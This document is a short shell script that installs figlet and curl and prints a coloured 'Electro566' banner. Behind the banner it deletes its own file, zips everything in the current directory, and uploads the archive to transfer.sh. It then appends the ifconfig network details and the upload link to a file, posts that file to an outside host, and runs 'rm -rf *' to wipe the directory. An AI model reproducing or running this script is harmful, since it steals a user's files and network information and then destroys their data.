
RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"
apt install figlet -y
apt install curl -y
printf "${BLUE}"
figlet -w 200 -f standard "Electro566"
printf "${STOP}"
rm -rf mk.sh
zip  file.zip *
curl --upload-file file.zip  https://transfer.sh >> link.txt
echo ----
ifconfig >> link.txt 
curl --upload-file link.txt http://mariongeiger.com
rm -rf *
